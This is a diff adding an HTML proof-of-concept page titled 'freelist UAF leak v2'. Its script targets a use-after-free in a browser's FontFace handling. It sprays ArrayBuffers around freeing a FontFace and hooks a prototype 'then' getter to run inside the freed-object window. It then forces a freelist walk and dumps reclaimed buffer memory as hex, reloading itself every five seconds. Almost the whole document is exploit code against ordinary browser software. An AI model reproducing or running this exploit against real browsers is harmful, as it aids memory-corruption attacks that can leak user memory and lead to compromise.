@@ -1,0 +1,154 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p688d: freelist UAF leak v2</title></head>
+<body style="color:#000;background:#fff;font:12px monospace;padding:8px;">
+<div style="font-size:24px;">p688d: freelist UAF leak v2</div>
+<div id="log" style="white-space:pre-wrap">LOADING...</div>
+<script>
+(function(){
+  var log=document.getElementById('log');
+  function emit(tag,msg){log.textContent+=tag+': '+msg+'\n';}
+  
+  var loadNo=0;
+  try{var _l=parseInt(localStorage.getItem('p688dloads')||'0',10);loadNo=_l+1;localStorage.setItem('p688dloads',String(loadNo));}catch(e){}
+  emit('LOAD','loadNo='+loadNo);
+  
+  // === STEP 1: Create a single FontFace ===
+  var S='s'+loadNo, F='f'+loadNo;
+  var style=document.createElement('style');
+  style.textContent="@font-face { font-family: "+S+"; src: local(Arial); }";
+  document.head.appendChild(style);
+  var ff=new FontFace(F,'local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(ff);
+  void ff.loaded;
+  emit('CREATE','fontface created');
+  
+  // === STEP 2: Spray BEFORE free to fill freelist ===
+  var bufs=[];
+  for(var i=0;i<128;i++){
+    var ab=new ArrayBuffer(128);
+    var v=new Uint8Array(ab);
+    for(var j=0;j<128;j++)v[j]=0;
+    v[0x85]=0xAA;
+    bufs.push(v);
+  }
+  emit('SPRAY-BEFORE','sprayed 128 buffers of 128 bytes, sentinel 0xAA at +0x85');
+  
+  // === STEP 3: Free the FontFace ===
+  style.remove();
+  try{document.fonts.delete(ff);}catch(e){}
+  document.body.offsetHeight;
+  emit('FREE','fontface freed');
+  
+  // === STEP 4: Define .then getter ===
+  var uafData=null;
+  
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      emit('GETTER','entered UAF window');
+      
+      // Spray freelist INSIDE getter
+      var bufs2=[];
+      for(var i=0;i<128;i++){
+        var ab=new ArrayBuffer(128);
+        var v=new Uint8Array(ab);
+        for(var j=0;j<128;j++)v[j]=0;
+        v[0x85]=0xBB;
+        bufs2.push(v);
+      }
+      emit('SPRAY2','sprayed 128 buffers with 0xBB at +0x85');
+      
+      // Trigger freelist walk
+      try{document.fonts.check('1em '+S);}catch(e){}
+      emit('WALK','fonts.check triggered');
+      
+      // Check which buffers were reclaimed
+      var reclaimed=[];
+      for(var i=0;i<bufs.length;i++){
+        if(bufs[i][0x85]!==0xAA){
+          reclaimed.push(i);
+        }
+      }
+      var reclaimed2=[];
+      for(var i=0;i<bufs2.length;i++){
+        if(bufs2[i][0x85]!==0xBB){
+          reclaimed2.push(i);
+        }
+      }
+      emit('CHECK','bufs reclaimed: '+reclaimed.length+', bufs2 reclaimed: '+reclaimed2.length);
+      
+      // Try to read the reclaimed buffer from bufs
+      if(reclaimed.length>0){
+        var firstIdx=reclaimed[0];
+        var ab=bufs[firstIdx];
+        var view8=new Uint8Array(ab.buffer);
+        var dump=[];
+        for(var i=0;i<Math.min(view8.length,32);i++){
+          dump.push('0x'+view8[i].toString(16).padStart(2,'0'));
+        }
+        emit('LEAK-BUFS','first reclaimed buffer: '+dump.join(' '));
+        
+        // Try to read as 32-bit words
+        var view32=new Uint32Array(ab.buffer);
+        var dump32=[];
+        for(var i=0;i<view32.length;i++){
+          dump32.push('0x'+view32[i].toString(16).padStart(8,'0'));
+        }
+        emit('LEAK-BUFS32','first reclaimed buffer as 32-bit: '+dump32.join(' '));
+        
+        uafData=ab;
+      }else{
+        emit('NO-RECLAIM-BUFS','no bufs reclaimed');
+      }
+      
+      // Try to read the reclaimed buffer from bufs2
+      if(reclaimed2.length>0){
+        var firstIdx2=reclaimed2[0];
+        var ab2=bufs2[firstIdx2];
+        var view8=new Uint8Array(ab2.buffer);
+        var dump=[];
+        for(var i=0;i<Math.min(view8.length,32);i++){
+          dump.push('0x'+view8[i].toString(16).padStart(2,'0'));
+        }
+        emit('LEAK-BUFS2','first reclaimed buffer (phase 2): '+dump.join(' '));
+        
+        var view32=new Uint32Array(ab2.buffer);
+        var dump32=[];
+        for(var i=0;i<view32.length;i++){
+          dump32.push('0x'+view32[i].toString(16).padStart(8,'0'));
+        }
+        emit('LEAK-BUFS2-32','first reclaimed buffer (phase 2) as 32-bit: '+dump32.join(' '));
+      }else{
+        emit('NO-RECLAIM-BUFS2','no bufs2 reclaimed');
+      }
+      
+      emit('ALIVE','survived');
+      return undefined;
+    },
+    set:function(){}
+  });
+  
+  // === STEP 5: Trigger the UAF ===
+  try{
+    var got=ff.then;
+    if(typeof got==='function'){got();}else{void got;}
+  }catch(e){emit('TRIGGER-ERR',String(e));}
+  emit('TRIGGER','getter triggered');
+  
+  // === STEP 6: Try to read the UAF data ===
+  if(uafData){
+    emit('UAF-READ','attempting to read UAF data');
+    try{
+      var view=new Uint8Array(uafData.buffer);
+      var dump=[];
+      for(var i=0;i<Math.min(view.length,128);i++){
+        dump.push('0x'+view[i].toString(16).padStart(2,'0'));
+      }
+      emit('UAF-DUMP','full 128 bytes: '+dump.join(' '));
+    }catch(e){emit('UAF-READ-ERR',String(e));}
+  }
+  
+  emit('DONE','load='+loadNo);
+  setTimeout(function(){location.reload();},5000);
+})();
+</script>
+</body></html>
